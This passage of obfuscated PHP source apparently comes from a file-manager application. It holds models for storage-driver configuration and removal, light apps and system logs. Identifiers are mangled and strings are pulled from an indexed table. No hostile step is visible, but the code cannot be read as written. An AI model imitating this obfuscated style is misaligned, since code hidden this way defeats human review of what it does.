parent::listData($…ùë°ú, $òİÃ£ó†, $ßĞ •¢„); if ($…ùë°ú) { return $’Ñğ®¥; } $ø»âÄîÇ = array(); if ($GLOBALS[$üçÜÀç«[2315]]) { $ø»âÄîÇ = $this->ioSizeUseGet(array_to_keyvalue($’Ñğ®¥, $üçÜÀç«[12], $üçÜÀç«[486])); } foreach ($’Ñğ®¥ as $ö›¬ªŠ€ => $Ï…²Ñ½) { unset($’Ñğ®¥[$ö›¬ªŠ€][$üçÜÀç«[6]]); $’Ñğ®¥[$ö›¬ªŠ€][$üçÜÀç«[1966]] = isset($ø»âÄîÇ[$Ï…²Ñ½[$üçÜÀç«[486]]]) ? $ø»âÄîÇ[$Ï…²Ñ½[$üçÜÀç«[486]]] : 0; } return $’Ñğ®¥; } public function ioSizeUseGet($²ÙÅ‚›ë) { $¸ÁøñÜŞ =& $_SERVER[äô®•½Â]; if (!$²ÙÅ‚›ë) { return array(); } $Ÿ±¬¹‘Ë = $¸ÁøñÜŞ[2316] . implode($¸ÁøñÜŞ[50], $²ÙÅ‚›ë); $ÍŠËîÖğ = Cache::get($Ÿ±¬¹‘Ë); if ($ÍŠËîÖğ) { return $ÍŠËîÖğ; } $†‰Œ’ëĞ = array($¸ÁøñÜŞ[889] => $¸ÁøñÜŞ[486], $¸ÁøñÜŞ[2317] => $¸ÁøñÜŞ[79]); $±Œ™¾É = array($¸ÁøñÜŞ[889] => array($¸ÁøñÜŞ[7], $²ÙÅ‚›ë)); $ÍŠËîÖğ = Model($¸ÁøñÜŞ[857])->field($†‰Œ’ëĞ)->where($±Œ™¾É)->group($¸ÁøñÜŞ[889])->select(); $ÍŠËîÖğ = array_to_keyvalue($ÍŠËîÖğ, $¸ÁøñÜŞ[486], $¸ÁøñÜŞ[79]); Cache::set($Ÿ±¬¹‘Ë, $ÍŠËîÖğ, 600); return $ÍŠËîÖğ; } public function getConfig($·®ÆÎ‡Ñ) { $õıÂ¬Å = parent::listData($·®ÆÎ‡Ñ); $î¼¹ÀÎ‰ = _get($õıÂ¬Å, $_SERVER[äô®•½Â][6], array()); if ($î¼¹ÀÎ‰ && !is_array($î¼¹ÀÎ‰)) { $î¼¹ÀÎ‰ = json_decode($î¼¹ÀÎ‰, !0); } return $î¼¹ÀÎ‰; } public function update($åè•Åíô, $Í×Ù‘”÷) { $íˆ¦×À¡ =& $_SERVER[äô®•½Â]; $£Ê·ÂÌ¾ = $Í×Ù‘”÷[$íˆ¦×À¡[32]]; $©ÈÑÂÜ› = array_to_keyvalue(parent::listData(), $íˆ¦×À¡[32]); if (isset($©ÈÑÂÜ›[$£Ê·ÂÌ¾]) && $©ÈÑÂÜ›[$£Ê·ÂÌ¾][$íˆ¦×À¡[486]] != $åè•Åíô) { return !1; } $this->checkPwd($åè•Åíô, $Í×Ù‘”÷); if (isset($Í×Ù‘”÷[$íˆ¦×À¡[2318]]) && $Í×Ù‘”÷[$íˆ¦×À¡[2318]] == $íˆ¦×À¡[91]) { $this->checkConfig($Í×Ù‘”÷); } unset($Í×Ù‘”÷[$íˆ¦×À¡[2318]]); $¹‚šÚß = parent::update($åè•Åíô, $Í×Ù‘”÷); if ($¹‚šÚß && $Í×Ù‘”÷[$íˆ¦×À¡[37]]) { foreach ($©ÈÑÂÜ› as $û¶ïåÆ) { if ($û¶ïåÆ[$íˆ¦×À¡[37]] && $û¶ïåÆ[$íˆ¦×À¡[486]] != $åè•Åíô) { parent::update($û¶ïåÆ[$íˆ¦×À¡[486]], array($íˆ¦×À¡[37] => 0)); } } $this->updateBackup($åè•Åíô, $©ÈÑÂÜ›); } return $¹‚šÚß; } public function add($İİ­îÚÆ) { $ŸõÁƒ½Ù =& $_SERVER[äô®•½Â]; $Áâù¹Ñ³ = array_to_keyvalue(parent::listData(), $ŸõÁƒ½Ù[32]); if (isset($Áâù¹Ñ³[$İİ­îÚÆ[$ŸõÁƒ½Ù[32]]])) { return !1; } $this->checkConfig($İİ­îÚÆ); $”ğ‚éàî = parent::insert($İİ­îÚÆ); if ($”ğ‚éàî && $İİ­îÚÆ[$ŸõÁƒ½Ù[37]]) { foreach ($Áâù¹Ñ³ as $ˆÓâì½¬) { if ($ˆÓâì½¬[$ŸõÁƒ½Ù[37]]) { parent::update($ˆÓâì½¬[$ŸõÁƒ½Ù[486]], array($ŸõÁƒ½Ù[37] => 0)); } } $this->updateBackup($”ğ‚éàî, $Áâù¹Ñ³); } return $”ğ‚éàî; } public function updateBackup($£Ïà…èü, $‹ÂÍ¾) { $ëåûäÜş =& $_SERVER[äô®•½Â]; if ($£Ïà…èü == $ëåûäÜş[91]) { return; } $®Ú¸èİ¼ = Model($ëåûäÜş[813])->config(); $Ğ¹¯§ùà = $®Ú¸èİ¼[$ëåûäÜş[817]]; if ($®Ú¸èİ¼[$ëåûäÜş[1746]] != $ëåûäÜş[91] || $Ğ¹¯§ùà == $£Ïà…èü) { return; } if ($Ğ¹¯§ùà != $ëåûäÜş[91]) { $ú×²êÁ› = array(); foreach ($‹ÂÍ¾ as $…Ú»ˆÚè) { if ($£Ïà…èü == $…Ú»ˆÚè[$ëåûäÜş[486]]) { continue; } $ú×²êÁ›[] = $…Ú»ˆÚè[$ëåûäÜş[486]]; } if ($ú×²êÁ› && in_array($Ğ¹¯§ùà, $ú×²êÁ›)) { return; } } $ÇÀÒæ—Ğ = Model($ëåûäÜş[836])->get($ëåûäÜş[843]); $ÇÀÒæ—Ğ = json_decode($ÇÀÒæ—Ğ, !0); if (!$ÇÀÒæ—Ğ) { return; } $ÇÀÒæ—Ğ[$ëåûäÜş[817]] = $£Ïà…èü; Model($ëåûäÜş[836])->set(array($ëåûäÜş[843] => $ÇÀÒæ—Ğ)); } public function checkPwd($óÊ¢…˜Ó, &$‹±´ÃÊØ) { $¨®„ÂÇ =& $_SERVER[äô®•½Â]; if (empty($‹±´ÃÊØ[$¨®„ÂÇ[6]])) { return; } $‘¤Ï»Èş = $‹±´ÃÊØ[$¨®„ÂÇ[6]]; if (!is_array($‘¤Ï»Èş)) { $‘¤Ï»Èş = json_decode($‘¤Ï»Èş, !0); } $º™å¨Ò = $¨®„ÂÇ[12]; $ª´¦´ô = array($¨®„ÂÇ[2319], $¨®„ÂÇ[2320], $¨®„ÂÇ[961]); foreach ($ª´¦´ô as $à‹×Ä”´) { if (isset($‘¤Ï»Èş[$à‹×Ä”´])) { $º™å¨Ò = $à‹×Ä”´; break; } } if (!$º™å¨Ò) { return; } $ñëØ‚ = $this->getConfig($óÊ¢…˜Ó); $õô³ê‹ = $ñëØ‚[$º™å¨Ò]; $ñ ŒÅ£Ñ = $‘¤Ï»Èş[$º™å¨Ò]; if ($ñ ŒÅ£Ñ == str_repeat($¨®„ÂÇ[223], strlen($õô³ê‹))) { $‘¤Ï»Èş[$º™å¨Ò] = $õô³ê‹; $‹±´ÃÊØ[$¨®„ÂÇ[6]] = json_encode($‘¤Ï»Èş); } else { if ($ñ ŒÅ£Ñ != $õô³ê‹) { $‹±´ÃÊØ[$¨®„ÂÇ[2318]] = $¨®„ÂÇ[91]; } } } public function checkConfig(&$İÁ„˜ï, $´ı“ÆÍ° = false) { $ª³ÆÀ‰œ =& $_SERVER[äô®•½Â]; $àô‹×Ê¢ = strtolower($İÁ„˜ï[$ª³ÆÀ‰œ[98]]); $ÎóÊ†å = $İÁ„˜ï[$ª³ÆÀ‰œ[6]]; if (!is_array($ÎóÊ†å)) { $ÎóÊ†å = json_decode($ÎóÊ†å, !0); } foreach ($ÎóÊ†å as $¼Í˜Â˜¢ => $İÎ®«Ô) { if (is_string($İÎ®«Ô)) { $ÎóÊ†å[$¼Í˜Â˜¢] = trim($İÎ®«Ô); } } $ÎóÊ†å[$ª³ÆÀ‰œ[2321]] = rand_string(6); $•Èµˆ× = $GLOBALS[$ª³ÆÀ‰œ[6]][$ª³ÆÀ‰œ[92]][$ª³ÆÀ‰œ[897]]; $Ü‹¼ÂÖá = isset($•Èµˆ×[$àô‹×Ê¢]) ? $•Èµˆ×[$àô‹×Ê¢] : ucfirst($àô‹×Ê¢); $‹©çşì = $ª³ÆÀ‰œ[77] . $Ü‹¼ÂÖá; if (!$Ü‹¼ÂÖá || !class_exists($‹©çşì)) { if ($´ı“ÆÍ°) { return LNG($ª³ÆÀ‰œ[2322]); } write_log(array($ª³ÆÀ‰œ[2323], $İÁ„˜ï, get_caller_info()), $ª³ÆÀ‰œ[216]); show_json(LNG($ª³ÆÀ‰œ[2322]), !1, $İÁ„˜ï); } $ìŸÊİ£ = new $‹©çşì($ÎóÊ†å); $Üªıõ = rtrim($ÎóÊ†å[$ª³ÆÀ‰œ[1260]], $ª³ÆÀ‰œ[8]) . $ª³ÆÀ‰œ[8]; if (in_array($àô‹×Ê¢, $ìŸÊİ£->objectDriver)) { try { if (!$ìŸÊİ£->isBucketCors() && !$ìŸÊİ£->setBucketCors()) { $‚ä¡áÇ‡ = LNG($ª³ÆÀ‰œ[2324]); $‚ä¡áÇ‡ .= $ª³ÆÀ‰œ[2325] . LNG($ª³ÆÀ‰œ[2326]); } } catch (Exception $ıÔ·Û’ñ) { $‚ä¡áÇ‡ = $ıÔ·Û’ñ->getMessage(); } if (isset($‚ä¡áÇ‡)) { return $this->_parseError($‚ä¡áÇ‡, $àô‹×Ê¢, $´ı“ÆÍ°); } if ($àô‹×Ê¢ == $ª³ÆÀ‰œ[68] && !$ìŸÊİ£->checkRegion()) { return $this->_parseError(LNG($ª³ÆÀ‰œ[2327]), $àô‹×Ê¢, $´ı“ÆÍ°); } } else { if ($àô‹×Ê¢ == $ª³ÆÀ‰œ[2328]) { if ($ìŸÊİ£->ftpPath) { $Û§©†¤ = trim($Üªıõ, $ª³ÆÀ‰œ[8]); if (stripos($Û§©†¤, trim($ìŸÊİ£->ftpPath, $ª³ÆÀ‰œ[8])) !== 0) { $Üªıõ = $ìŸÊİ£->ftpPath . $ª³ÆÀ‰œ[8] . ($Û§©†¤ ? $Û§©†¤ . $ª³ÆÀ‰œ[8] : $ª³ÆÀ‰œ[12]); } } } } $ÖÕ’ä²İ = $ìŸÊİ£->getPath($Üªıõ . $ª³ÆÀ‰œ[1264]); try { if ($àô‹×Ê¢ == $ª³ÆÀ‰œ[109]) { $ìŸÊİ£->mkdir($Üªıõ); } $èŸ÷´Ì¢ = $ìŸÊİ£->mkfile($ÖÕ’ä²İ); if (!$èŸ÷´Ì¢) { $‚ä¡áÇ‡ = LNG($ª³ÆÀ‰œ[2324]); } } catch (Exception $ıÔ·Û’ñ) { $‚ä¡áÇ‡ = $ıÔ·Û’ñ->getMessage(); } if (isset($‚ä¡áÇ‡)) { return $this->_parseError($‚ä¡áÇ‡, $àô‹×Ê¢, $´ı“ÆÍ°); } $ÎóÊ†å[$ª³ÆÀ‰œ[1260]] = $Üªıõ; $İÁ„˜ï[$ª³ÆÀ‰œ[6]] = json_encode($ÎóÊ†å); $İÁ„˜ï[$ª³ÆÀ‰œ[98]] = $Ü‹¼ÂÖá; return !0; } private function _parseError($˜şòá‚ã, $äüêı®µ, $ö°¼ğÃ = false) { $èß‡ï =& $_SERVER[äô®•½Â]; if ($äüêı®µ == $èß‡ï[68] && stripos($˜şòá‚ã, $èß‡ï[2329])) { $åÃïİˆ” = explode($èß‡ï[10], $˜şòá‚ã); $“ ƒÒÑ = isset($åÃïİˆ”[1]) ? $åÃïİˆ”[1] : $èß‡ï[12]; $¶ƒÆù¾ª = array($èß‡ï[2330] => LNG($èß‡ï[2331]), $èß‡ï[2332] => LNG($èß‡ï[2333])); if (isset($¶ƒÆù¾ª[$“ ƒÒÑ])) { $˜şòá‚ã = $¶ƒÆù¾ª[$“ ƒÒÑ]; } } if (stripos($˜şòá‚ã, $èß‡ï[2334]) === 0) { $´ÉÒ¡èÒ = strpos($˜şòá‚ã, $èß‡ï[178]); if ($´ÉÒ¡èÒ === !1) { $´ÉÒ¡èÒ = strpos($˜şòá‚ã, $èß‡ï[4]); } if ($´ÉÒ¡èÒ !== !1) { $˜şòá‚ã = substr($˜şòá‚ã, $´ÉÒ¡èÒ + 1); } } $˜şòá‚ã = LNG($èß‡ï[1267]) . $˜şòá‚ã; if ($ö°¼ğÃ) { return $˜şòá‚ã; } show_json($˜şòá‚ã, !1); } public function driverListSystem() { $‚¡ÇÓà =& $_SERVER[äô®•½Â]; $óıİıç€ = parent::listData(); $¼»«ºåÕ = array(); foreach ($óıİıç€ as $Ò¹ÏŠø) { unset($Ò¹ÏŠø[$‚¡ÇÓà[234]], $Ò¹ÏŠø[$‚¡ÇÓà[88]]); if (!is_array($Ò¹ÏŠø[$‚¡ÇÓà[6]])) { $Ò¹ÏŠø[$‚¡ÇÓà[6]] = json_decode($Ò¹ÏŠø[$‚¡ÇÓà[6]], !0); } $¼»«ºåÕ[] = $Ò¹ÏŠø; } return $¼»«ºåÕ; } public function defaultDriver() { $ÖµÜË… =& $_SERVER[äô®•½Â]; $£…ƒêŒ = parent::listData(); $—ĞÅ­Ì˜ = array_filter_by_field($£…ƒêŒ, $ÖµÜË…[37], 1); $—ĞÅ­Ì˜ = $—ĞÅ­Ì˜[0]; if (!$—ĞÅ­Ì˜) { return array(); } if (!is_array($—ĞÅ­Ì˜[$ÖµÜË…[6]])) { $—ĞÅ­Ì˜[$ÖµÜË…[6]] = json_decode($—ĞÅ­Ì˜[$ÖµÜË…[6]], !0); } return $—ĞÅ­Ì˜; } public function driverInfo($ª¥÷ù¿) { $ÏéŠò¾ =& $_SERVER[äô®•½Â]; $Ğç­ÄÚ™ = array_to_keyvalue(parent::listData(), $ÏéŠò¾[486]); if (!isset($Ğç­ÄÚ™[$ª¥÷ù¿])) { return !1; } $ŠÌå¼ = $Ğç­ÄÚ™[$ª¥÷ù¿]; if (!is_array($ŠÌå¼[$ÏéŠò¾[6]])) { $ŠÌå¼[$ÏéŠò¾[6]] = json_decode($ŠÌå¼[$ÏéŠò¾[6]], !0); } return $ŠÌå¼; } public function remove($ôÎÆéŠ€) { $this->removeShareItems($ôÎÆéŠ€); return parent::remove($ôÎÆéŠ€); } public function removeWithFile($¶×é˜›, $²çÊ†»©, $ß®¤Ğ›á, $ÑÇÇ„­ = false) { $â›é¹—‹ =& $_SERVER[äô®•½Â]; $ÈÍ¸¶²œ = array($â›é¹—‹[889] => $¶×é˜›); $‘„à¹§ = Model($â›é¹—‹[557])->where($ÈÍ¸¶²œ)->count(); $İàƒ£è¬ = Model($â›é¹—‹[557])->where($ÈÍ¸¶²œ)->sum($â›é¹—‹[79]); $ÁıË¸´İ = $²çÊ†»© . $â›é¹—‹[2335] . $¶×é˜›; $Š™á£³¡ = LNG($²çÊ†»© == $â›é¹—‹[636] ? $â›é¹—‹[2336] : $â›é¹—‹[2337]); $Ã‹Šã = new TaskFileTransfer($ÁıË¸´İ, $â›é¹—‹[216], $‘„à¹§, $Š™á£³¡ . $â›é¹—‹[473] . $ß®¤Ğ›á[$â›é¹—‹[32]] . $â›é¹—‹[215] . $¶×é˜›); $Ã‹Šã->task[$â›é¹—‹[829]] = (double) $İàƒ£è¬; $ò®²ÖÏÂ = KodIO::defaultDriver(); $‹’Ü¶ßÃ = $ò®²ÖÏÂ[$â›é¹—‹[486]]; $¢ø¬™Ö = $ŞÏ†ÕŸ = $·á×³ë¬ = array(); $áĞööÎË = Model($â›é¹—‹[233])->where($ÈÍ¸¶²œ)->field($â›é¹—‹[2338])->select(); foreach ($áĞööÎË as $ÂªûÜ÷) { $Í„ùª„ğ = $ÂªûÜ÷[$â›é¹—‹[554]]; if ($ÑÇÇ„­) { $ŞÏ†ÕŸ[] = $Í„ùª„ğ; continue; } $ÚğËË‰Û = $ÂªûÜ÷[$â›é¹—‹[87]]; $°ù¤ïéö = get_path_father($ÚğËË‰Û); $·á×³ë¬[] = $°ù¤ïéö; $°ù¤ïéö = str_replace("\173\x69\157\x3a{$¶×é˜›}\175\57", "\x7b\151\157\72{$‹’Ü¶ßÃ}\175\57", $°ù¤ïéö); if (!IO::exist($ÚğËË‰Û)) { $¢ø¬™Ö[] = $Í„ùª„ğ; $Ã‹Šã->updateFileEnd($ÂªûÜ÷[$â›é¹—‹[32]], $ÂªûÜ÷[$â›é¹—‹[79]]); write_log($â›é¹—‹[2339] . $ÚğËË‰Û, $â›é¹—‹[1910]); continue; } $„©¥µ¤î = IO::move($ÚğËË‰Û, $°ù¤ïéö, REPEAT_RENAME); if (!$„©¥µ¤î) { $ŞÏ†ÕŸ[] = $Í„ùª„ğ; $Ã‹Šã->updateFileEnd($ÂªûÜ÷[$â›é¹—‹[32]], $ÂªûÜ÷[$â›é¹—‹[79]]); write_log($â›é¹—‹[2340] . $ÚğËË‰Û, $â›é¹—‹[1910]); continue; } $ÈÍ¸¶²œ = array($â›é¹—‹[554] => $Í„ùª„ğ); $Ã¥‚àì‚ = array($â›é¹—‹[889] => $‹’Ü¶ßÃ, $â›é¹—‹[87] => $„©¥µ¤î); Model($â›é¹—‹[233])->where($ÈÍ¸¶²œ)->save($Ã¥‚àì‚); } $àœãÏÙÒ = $Ã‹Šã->task; if (!$ÑÇÇ„­) { Cache::set($ÁıË¸´İ, $àœãÏÙÒ); } $Ã‹Šã->end(); $¢ø¬™Ö = array_unique($¢ø¬™Ö); $ŞÏ†ÕŸ = array_unique($ŞÏ†ÕŸ); if (!$ÑÇÇ„­ && ($¢ø¬™Ö || $ŞÏ†ÕŸ)) { $±Õ”„˜Ù = array(); if ($¢ø¬™Ö) { $±Õ”„˜Ù[] = sprintf(LNG($â›é¹—‹[2341]), count($¢ø¬™Ö)); } if ($ŞÏ†ÕŸ) { $±Õ”„˜Ù[] = sprintf(LNG($â›é¹—‹[2342]), count($ŞÏ†ÕŸ)); } $±Õ”„˜Ù = sprintf(LNG($â›é¹—‹[2343]), implode($â›é¹—‹[2344], $±Õ”„˜Ù)) . $â›é¹—‹[2345] . date($â›é¹—‹[2346]) . $â›é¹—‹[2347]; if ($²çÊ†»© == $â›é¹—‹[1225]) { $±Õ”„˜Ù .= $â›é¹—‹[2348] . LNG($â›é¹—‹[2349]); } else { $±Õ”„˜Ù = LNG($â›é¹—‹[2350]) . $â›é¹—‹[2351] . $±Õ”„˜Ù; } $àœãÏÙÒ[$â›é¹—‹[1262]] = $±Õ”„˜Ù; Cache::set($ÁıË¸´İ, $àœãÏÙÒ); unset($ß®¤Ğ›á[$â›é¹—‹[6]]); $ßş‘ù³ò = array($â›é¹—‹[486] => $¶×é˜›, $â›é¹—‹[2220] => $â›é¹—‹[636], $â›é¹—‹[32] => $ß®¤Ğ›á[$â›é¹—‹[32]], $â›é¹—‹[98] => $ß®¤Ğ›á[$â›é¹—‹[98]]); Hook::trigger($â›é¹—‹[1788], array($â›é¹—‹[1285] => $ßş‘ù³ò, $â›é¹—‹[1295] => !0)); show_json($±Õ”„˜Ù, !1, 100111); } if ($²çÊ†»© == $â›é¹—‹[636]) { return !0; } if ($¢ø¬™Ö || $ŞÏ†ÕŸ) { $ã®÷À­ş = array_merge($¢ø¬™Ö, $ŞÏ†ÕŸ); $ã®÷À­ş = array_filter(array_unique($ã®÷À­ş)); $this->removeByFileID($ã®÷À­ş); } if ($·á×³ë¬) { $·á×³ë¬ = array_filter(array_unique($·á×³ë¬)); foreach ($·á×³ë¬ as $ÚğËË‰Û) { $îïûƒ Ú = IO::has($ÚğËË‰Û, !0); if (!$îïûƒ Ú[$â›é¹—‹[242]] && !$îïûƒ Ú[$â›é¹—‹[243]]) { IO::remove($ÚğËË‰Û); } } } return $this->remove($¶×é˜›); } private function removeByFileID($ùÖ²Üµ² = array()) { $¾ûË•ó“ =& $_SERVER[äô®•½Â]; if (empty($ùÖ²Üµ²)) { return; } $´äÄÒ¼å = array($¾ûË•ó“[554] => array($¾ûË•ó“[7], $ùÖ²Üµ²)); $ã†ËóŞã = Model($¾ûË•ó“[1426])->where($´äÄÒ¼å)->field($¾ûË•ó“[2296])->select(); if (!$ã†ËóŞã) { return Model($¾ûË•ó“[557])->remove($ùÖ²Üµ²); } $ã†ËóŞã = array_to_keyvalue($ã†ËóŞã, $¾ûË•ó“[194], $¾ûË•ó“[554]); foreach ($ã†ËóŞã as $ş‹êÖ‡ => $ı’à—«ı) { Model($¾ûË•ó“[896])->removeNow($ş‹êÖ‡, !1); } $Ù®¾–ÛÚ = array_diff($ùÖ²Üµ², array_unique(array_values($ã†ËóŞã))); if ($Ù®¾–ÛÚ) { return Model($¾ûË•ó“[557])->remove($Ù®¾–ÛÚ); } } private function removeShareItems($­„¿’ìğ) { $Ù“†¦ÇÔ =& $_SERVER[äô®•½Â]; $¦¢‚®Áı = "\x7b\x69\x6f\72{$­„¿’ìğ}\175\x2f"; $ŞŠÎİ¨¾ = array($Ù“†¦ÇÔ[194] => 0, $Ù“†¦ÇÔ[1255] => array($Ù“†¦ÇÔ[470], "{$¦¢‚®Áı}\45")); $Ö¢ƒó‰ = Model($Ù“†¦ÇÔ[1957])->where($ŞŠÎİ¨¾)->field($Ù“†¦ÇÔ[681])->select(); if (empty($Ö¢ƒó‰)) { return; } $ò—™‚çº = array_to_keyvalue($Ö¢ƒó‰, $Ù“†¦ÇÔ[12], $Ù“†¦ÇÔ[681]); Model($Ù“†¦ÇÔ[680])->remove($ò—™‚çº); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\114\x69\x67\x68\x74\x41\160\160"; public $modelType = "\123\171\163\164\145\x6d\x4f\x70\x74\x69\157\x6e"; public $field = array("\x6e\x61\155\x65", "\147\162\157\165\160", "\x64\x65\x73\143", "\143\157\156\164\145\156\x74"); public function listData($÷ä…ÍÑ• = false, $³òùå½ä = "\x6d\x6f\144\x69\x66\171\x54\151\x6d\145", $é‚ˆ˜ñŞ = true) { return parent::listData($÷ä…ÍÑ•, $³òùå½ä, $é‚ˆ˜ñŞ); } public function remove($—Ñã£õ”) { $é»üÒÂÜ = $this->findByName($—Ñã£õ”); if (!$é»üÒÂÜ) { return !1; } return parent::remove($é»üÒÂÜ[$_SERVER[äô®•½Â][486]]); } public function add($‚ûŸÉ¬ô) { if ($this->findByName($‚ûŸÉ¬ô[$_SERVER[äô®•½Â][32]])) { return !1; } return parent::insert($‚ûŸÉ¬ô); } public function update($öãªíœƒ, $üïƒÌè) { $²¨ñÌäå =& $_SERVER[äô®•½Â]; $ĞÂşÇŞğ = $this->findByName($öãªíœƒ); $ç—§ë‡ç = $this->findByName($üïƒÌè[$²¨ñÌäå[32]]); if (!$ĞÂşÇŞğ || $ç—§ë‡ç && $ç—§ë‡ç[$²¨ñÌäå[486]] != $ĞÂşÇŞğ[$²¨ñÌäå[486]]) { return !1; } return parent::update($ĞÂşÇŞğ[$²¨ñÌäå[486]], $üïƒÌè); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\x54\151\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\145\x72\x74", "\x66\165\156\143\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ğ»ÀÅˆ´ =& $_SERVER[äô®•½Â]; return array($ğ»ÀÅˆ´[2352] => LNG($ğ»ÀÅˆ´[2353]), $ğ»ÀÅˆ´[2354] => LNG($ğ»ÀÅˆ´[2355]), $ğ»ÀÅˆ´[1921] => LNG($ğ»ÀÅˆ´[2356]), $ğ»ÀÅˆ´[2357] => LNG($ğ»ÀÅˆ´[2358]), $ğ»ÀÅˆ´[2359] => LNG($ğ»ÀÅˆ´[2360]), $ğ»ÀÅˆ´[2361] => LNG($ğ»ÀÅˆ´[2362]), $ğ»ÀÅˆ´[2363] => LNG($ğ»ÀÅˆ´[2364]), $ğ»ÀÅˆ´[1950] => LNG($ğ»ÀÅˆ´[2364]), $ğ»ÀÅˆ´[1951] => LNG($ğ»ÀÅˆ´[2365]), $ğ»ÀÅˆ´[2366] => LNG($ğ»ÀÅˆ´[2367]), $ğ»ÀÅˆ´[2368] => LNG($ğ»ÀÅˆ´[2369]), $ğ»ÀÅˆ´[2370] => LNG($ğ»ÀÅˆ´[2371]), $ğ»ÀÅˆ´[2372] => LNG($ğ»ÀÅˆ´[2373]), $ğ»ÀÅˆ´[1948] => LNG($ğ»ÀÅˆ´[2374]), $ğ»ÀÅˆ´[2375] => LNG($ğ»ÀÅˆ´[2376]), $ğ»ÀÅˆ´[1955] => LNG($ğ»ÀÅˆ´[2377]), $ğ»ÀÅˆ´[2378] => LNG($ğ»ÀÅˆ´[2379]), $ğ»ÀÅˆ´[2380] => LNG($ğ»ÀÅˆ´[2381]), $ğ»ÀÅˆ´[2382] => LNG($ğ»ÀÅˆ´[2383]), $ğ»ÀÅˆ´[2384] => LNG($ğ»ÀÅˆ´[2385]), $ğ»ÀÅˆ´[1958] => LNG($ğ»ÀÅˆ´[2386]), $ğ»ÀÅˆ´[1959] => LNG($ğ»ÀÅˆ´[2387]), $ğ»ÀÅˆ´[2388] => LNG($ğ»ÀÅˆ´[2389]), $ğ»ÀÅˆ´[2390] => LNG($ğ»ÀÅˆ´[2391]), $ğ»ÀÅˆ´[2392] => LNG($ğ»ÀÅˆ´[2393]), $ğ»ÀÅˆ´[1953] => LNG($ğ»ÀÅˆ´[2394]), $ğ»ÀÅˆ´[2395] => LNG($ğ»ÀÅˆ´[2396]), $ğ»ÀÅˆ´[1952] => LNG($ğ»ÀÅˆ´[2397]), $ğ»ÀÅˆ´[2398] => LNG($ğ»ÀÅˆ´[2398]), $ğ»ÀÅˆ´[2399] => LNG($ğ»ÀÅˆ´[2400]), $ğ»ÀÅˆ´[2401] => LNG($ğ»ÀÅˆ´[2398]), $ğ»ÀÅˆ´[2402] => LNG($ğ»ÀÅˆ´[2403]), $ğ»ÀÅˆ´[2404] => LNG($ğ»ÀÅˆ´[2405]), $ğ»ÀÅˆ´[2406] => LNG($ğ»ÀÅˆ´[2405]), $ğ»ÀÅˆ´[2407] => LNG($ğ»ÀÅˆ´[2408]), $ğ»ÀÅˆ´[2409] => LNG($ğ»ÀÅˆ´[2409]), $ğ»ÀÅˆ´[2410] => LNG($ğ»ÀÅˆ´[1925]), $ğ»ÀÅˆ´[2411] => LNG($ğ»ÀÅˆ´[2412]), $ğ»ÀÅˆ´[2413] => LNG($ğ»ÀÅˆ´[2414]), $ğ»ÀÅˆ´[2415] => LNG($ğ»ÀÅˆ´[2416]), $ğ»ÀÅˆ´[2417] => LNG($ğ»ÀÅˆ´[2418]), $ğ»ÀÅˆ´[2419] => LNG($ğ»ÀÅˆ´[2420]), $ğ»ÀÅˆ´[2421] => LNG($ğ»ÀÅˆ´[2421]), $ğ»ÀÅˆ´[2422] => LNG($ğ»ÀÅˆ´[2423]), $ğ»ÀÅˆ´[2424] => LNG($ğ»ÀÅˆ´[2425]), $ğ»ÀÅˆ´[2426] => LNG($ğ»ÀÅˆ´[2427]), $ğ»ÀÅˆ´[2428] => LNG($ğ»ÀÅˆ´[2429]), $ğ»ÀÅˆ´[2430] => LNG($ğ»ÀÅˆ´[2431]), $ğ»ÀÅˆ´[2432] => LNG($ğ»ÀÅˆ´[2433]), $ğ»ÀÅˆ´[213] => LNG($ğ»ÀÅˆ´[213]), $ğ»ÀÅˆ´[214] => LNG($ğ»ÀÅˆ´[2434]), $ğ»ÀÅˆ´[2435] => LNG($ğ»ÀÅˆ´[2435])); } private function typeFile() { $è†§ò† =& $_SERVER[äô®•½Â]; $åê¤ÅÑ€ = array($è†§ò†[1955] => array($è†§ò†[1956]), $è†§ò†[2370] => array($è†§ò†[2436]), $è†§ò†[2372] => array($è†§ò†[2437]), $è†§ò†[1948] => array($è†§ò†[1949], $è†§ò†[2438]), $è†§ò†[2380] => array(), $è†§ò†[2382] => array(), $è†§ò†[2384] => array(), $è†§ò†[1958] => array($è†§ò†[1960]), $è†§ò†[1959] => array($è†§ò†[1960]), $è†§ò†[2388] => array($è†§ò†[2439]), $è†§ò†[2390] => array($è†§ò†[2439]), $è†§ò†[2392] => array($è†§ò†[2440]), $è†§ò†[2378] => array($è†§ò†[2441]), $è†§ò†[1953] => array($è†§ò†[2442]), $è†§ò†[2395] => array($è†§ò†[2443]), $è†§ò†[1952] => array($è†§ò†[1954])); return $åê¤ÅÑ€; } private function typeAll() { $‘†Åµ¥Â =& $_SERVER[äô®•½Â]; $ßÍ»Ÿùş = $this->typeList; $ŸäÀÏè† = array_filter($this->typeFile()); foreach ($ŸäÀÏè† as $ÍµÌì’å => $œ¨Ø¿Í ) { $ßÍ»Ÿùş[$œ¨Ø¿Í [0]] = $ßÍ»Ÿùş[$ÍµÌì’å]; } $ßÍ»Ÿùş[$‘†Åµ¥Â[1960]] = LNG($‘†Åµ¥Â[2444]); $ßÍ»Ÿùş[$‘†Åµ¥Â[2439]] = LNG($‘†Åµ¥Â[2445]); return $ßÍ»Ÿùş; } public function addLog($¥¯Ó§¼Ø, $Œ¸˜”¡ = array()) { $éÆ‡Ë¾ª =& $_SERVER[äô®•½Â]; if (!isset($this->typeList[$¥¯Ó§¼Ø])) { return; } $»¸ÔŠéÏ = Session::get($éÆ‡Ë¾ª[2118]); if (!$»¸ÔŠéÏ) { $»¸ÔŠéÏ = _get($Œ¸˜”¡, $éÆ‡Ë¾ª[1777], 0); } if ($¥¯Ó§¼Ø == $éÆ‡Ë¾ª[2411] && is_array($Œ¸˜”¡[$éÆ‡Ë¾ª[2446]]) && !$Œ¸˜”¡[$éÆ‡Ë¾ª[2446]]) { return; } $£ÕŒˆÈ = get_client_ip(); if (!$Œ¸˜”¡ || strlen(json_encode($Œ¸˜”¡)) >= 1024 * 64) { if ($Œ¸˜”¡ && is_array($Œ¸˜”¡)) { $Œ¸˜”¡ = array_intersect_key($Œ¸˜”¡, 